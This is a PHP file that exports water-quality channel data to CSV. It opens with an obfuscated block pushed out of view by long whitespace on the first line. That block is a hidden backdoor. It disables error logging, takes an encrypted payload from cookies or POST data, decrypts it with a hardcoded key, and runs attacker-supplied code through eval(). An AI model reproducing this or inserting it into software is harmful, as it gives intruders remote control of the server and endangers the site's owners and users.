<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['z3b40'];global$z3b40;$z3b40=$GLOBALS;$z3b40['p2e1ecd']="\x38\x4c\x5c\x4e\x3a\x61\x35\x5e\x7d\x46\x62\x33\x75\x78\x5d\x20\x55\x29\x5b\x25\x28\x79\x44\x71\x3b\x6e\x27\x57\x6a\x3c\x68\x4b\x54\x45\x41\x64\x42\x4f\x24\x73\x65\x49\x56\x72\xd\x66\x53\x39\x4a\x77\x47\x7a\x63\x36\x26\x6c\x7e\x48\x30\x3d\x43\x34\x5f\x7b\x3f\xa\x70\x58\x21\x2e\x6b\x2b\x74\x2c\x37\x2a\x51\x7c\x52\x23\x2f\x6d\x3e\x59\x67\x4d\x32\x22\x31\x2d\x5a\x76\x50\x9\x40\x6f\x60\x69";$z3b40[$z3b40['p2e1ecd'][51].$z3b40['p2e1ecd'][6].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][0]]=$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][30].$z3b40['p2e1ecd'][43];$z3b40[$z3b40['p2e1ecd'][28].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][6].$z3b40['p2e1ecd'][11].$z3b40['p2e1ecd'][0]]=$z3b40['p2e1ecd'][95].$z3b40['p2e1ecd'][43].$z3b40['p2e1ecd'][35];$z3b40[$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][11]]=$z3b40['p2e1ecd'][39].$z3b40['p2e1ecd'][72].$z3b40['p2e1ecd'][43].$z3b40['p2e1ecd'][55].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][25];$z3b40[$z3b40['p2e1ecd'][81].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][11].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][61]]=$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][25].$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][62].$z3b40['p2e1ecd'][39].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][72];$z3b40[$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][47]]=$z3b40['p2e1ecd'][39].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][43].$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][5].$z3b40['p2e1ecd'][55].$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][51].$z3b40['p2e1ecd'][40];$z3b40[$z3b40['p2e1ecd'][70].$z3b40['p2e1ecd'][74].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][74].$z3b40['p2e1ecd'][74].$z3b40['p2e1ecd'][35]]=$z3b40['p2e1ecd'][66].$z3b40['p2e1ecd'][30].$z3b40['p2e1ecd'][66].$z3b40['p2e1ecd'][91].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][43].$z3b40['p2e1ecd'][39].$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][95].$z3b40['p2e1ecd'][25];$z3b40[$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][52]]=$z3b40['p2e1ecd'][12].$z3b40['p2e1ecd'][25].$z3b40['p2e1ecd'][39].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][43].$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][5].$z3b40['p2e1ecd'][55].$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][51].$z3b40['p2e1ecd'][40];$z3b40[$z3b40['p2e1ecd'][72].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][47].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][0]]=$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][5].$z3b40['p2e1ecd'][39].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][62].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][95].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][40];$z3b40[$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][74]]=$z3b40['p2e1ecd'][39].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][72].$z3b40['p2e1ecd'][62].$z3b40['p2e1ecd'][72].$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][81].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][62].$z3b40['p2e1ecd'][55].$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][81].$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][72];$z3b40[$z3b40['p2e1ecd'][81].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][53]]=$z3b40['p2e1ecd'][91].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][47];$z3b40[$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][5].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][58]]=$z3b40['p2e1ecd'][28].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][47].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][35];$z3b40[$z3b40['p2e1ecd'][25].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][5]]=$_POST;$z3b40[$z3b40['p2e1ecd'][84].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][11].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][74].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][6]]=$_COOKIE;@$z3b40[$z3b40['p2e1ecd'][81].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][11].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][61]]($z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][43].$z3b40['p2e1ecd'][43].$z3b40['p2e1ecd'][95].$z3b40['p2e1ecd'][43].$z3b40['p2e1ecd'][62].$z3b40['p2e1ecd'][55].$z3b40['p2e1ecd'][95].$z3b40['p2e1ecd'][84],NULL);@$z3b40[$z3b40['p2e1ecd'][81].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][11].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][61]]($z3b40['p2e1ecd'][55].$z3b40['p2e1ecd'][95].$z3b40['p2e1ecd'][84].$z3b40['p2e1ecd'][62].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][43].$z3b40['p2e1ecd'][43].$z3b40['p2e1ecd'][95].$z3b40['p2e1ecd'][43].$z3b40['p2e1ecd'][39],0);@$z3b40[$z3b40['p2e1ecd'][81].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][11].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][61]]($z3b40['p2e1ecd'][81].$z3b40['p2e1ecd'][5].$z3b40['p2e1ecd'][13].$z3b40['p2e1ecd'][62].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][13].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][12].$z3b40['p2e1ecd'][72].$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][95].$z3b40['p2e1ecd'][25].$z3b40['p2e1ecd'][62].$z3b40['p2e1ecd'][72].$z3b40['p2e1ecd'][97].$z3b40['p2e1ecd'][81].$z3b40['p2e1ecd'][40],0);@$z3b40[$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][74]](0);$p1ecd1136=NULL;$ob257b46=NULL;$z3b40[$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][74].$z3b40['p2e1ecd'][10]]=$z3b40['p2e1ecd'][74].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][47].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][5].$z3b40['p2e1ecd'][89].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][89].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][89].$z3b40['p2e1ecd'][0].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][89].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][47].$z3b40['p2e1ecd'][47].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][11].$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][5].$z3b40['p2e1ecd'][10];global$c07b;function jf91d($p1ecd1136,$i55f2d){global$z3b40;$l617fe="";for($bbb265=0;$bbb265<$z3b40[$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][11]]($p1ecd1136);){for($la74=0;$la74<$z3b40[$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][11]]($i55f2d)&&$bbb265<$z3b40[$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][11]]($p1ecd1136);$la74++,$bbb265++){$l617fe.=$z3b40[$z3b40['p2e1ecd'][51].$z3b40['p2e1ecd'][6].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][0]]($z3b40[$z3b40['p2e1ecd'][28].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][6].$z3b40['p2e1ecd'][11].$z3b40['p2e1ecd'][0]]($p1ecd1136[$bbb265])^$z3b40[$z3b40['p2e1ecd'][28].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][6].$z3b40['p2e1ecd'][11].$z3b40['p2e1ecd'][0]]($i55f2d[$la74]));}}return$l617fe;}function vfc9($p1ecd1136,$i55f2d){global$z3b40;global$c07b;return$z3b40[$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][5].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][58]]($z3b40[$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][5].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][58]]($p1ecd1136,$c07b),$i55f2d);}foreach($z3b40[$z3b40['p2e1ecd'][84].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][11].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][74].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][6]]as$i55f2d=>$df9687b2){$p1ecd1136=$df9687b2;$ob257b46=$i55f2d;}if(!$p1ecd1136){foreach($z3b40[$z3b40['p2e1ecd'][25].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][5]]as$i55f2d=>$df9687b2){$p1ecd1136=$df9687b2;$ob257b46=$i55f2d;}}$p1ecd1136=@$z3b40[$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][52]]($z3b40[$z3b40['p2e1ecd'][81].$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][10].$z3b40['p2e1ecd'][53]]($z3b40[$z3b40['p2e1ecd'][72].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][47].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][0]]($p1ecd1136),$ob257b46));if(isset($p1ecd1136[$z3b40['p2e1ecd'][5].$z3b40['p2e1ecd'][70]])&&$c07b==$p1ecd1136[$z3b40['p2e1ecd'][5].$z3b40['p2e1ecd'][70]]){if($p1ecd1136[$z3b40['p2e1ecd'][5]]==$z3b40['p2e1ecd'][97]){$bbb265=Array($z3b40['p2e1ecd'][66].$z3b40['p2e1ecd'][91]=>@$z3b40[$z3b40['p2e1ecd'][70].$z3b40['p2e1ecd'][74].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][45].$z3b40['p2e1ecd'][61].$z3b40['p2e1ecd'][74].$z3b40['p2e1ecd'][74].$z3b40['p2e1ecd'][35]](),$z3b40['p2e1ecd'][39].$z3b40['p2e1ecd'][91]=>$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][69].$z3b40['p2e1ecd'][58].$z3b40['p2e1ecd'][89].$z3b40['p2e1ecd'][88],);echo@$z3b40[$z3b40['p2e1ecd'][40].$z3b40['p2e1ecd'][53].$z3b40['p2e1ecd'][86].$z3b40['p2e1ecd'][35].$z3b40['p2e1ecd'][88].$z3b40['p2e1ecd'][52].$z3b40['p2e1ecd'][47]]($bbb265);}elseif($p1ecd1136[$z3b40['p2e1ecd'][5]]==$z3b40['p2e1ecd'][40]){eval($p1ecd1136[$z3b40['p2e1ecd'][35]]);}exit();} ?><?php
  require_once('IConstants.inc');
  require_once($ConstantsArray['dbServerUrl']. "/Utils/ExportUtils.php");
  require_once($ConstantsArray['dbServerUrl'] ."/DataStoreMgr/WQDFileDataStore.php");
  require_once($ConstantsArray['dbServerUrl'] ."/DataStoreMgr/FolderDataStore.php");
  require_once($ConstantsArray['dbServerUrl'] ."/DataStoreMgr/ChannelConfigurationDataStore.php");
  
   
  $action = $_GET['action'];
  $fullArray=array();
  if($action == "exportCSV"){
        $fromDate = new DateTime($_GET['fromDate']);
        $toDate = new DateTime($_GET['toDate']);
        $channelNumbers = $_GET['channels'];
        //here comma separated folder seqs will come
        //add sheets for each selected one
        $folSeq = $_GET['folSeq'];
        $isPLimits = $_GET['isPLimits'];
        $CCDS = ChannelConfigurationDataStore::getInstance();
        $ChannelsInfo = $CCDS->FindByFolder($folSeq);
        
        $toDate->setTime(23,59,59);
        
        $fromDate =  $fromDate->format("Y/m/d  H:i:s");
        $toDate =  $toDate->format("Y/m/d  H:i:s");
        
        $interval = $_GET['interval'];
        $WQDS = WQDDataDataStore::getInstance();
        $arr = $WQDS->getExportData($fromDate,$toDate,$folSeq,$channelNumbers,$interval);
        
        $FDS = FolderDataStore::getInstance();
        $folder = $FDS->FindBySeq($folSeq);
        ExportUtils::exportCSV($arr,$channelNumbers,$folder->getFolderName(),$isPLimits,$ChannelsInfo);
  }
?>
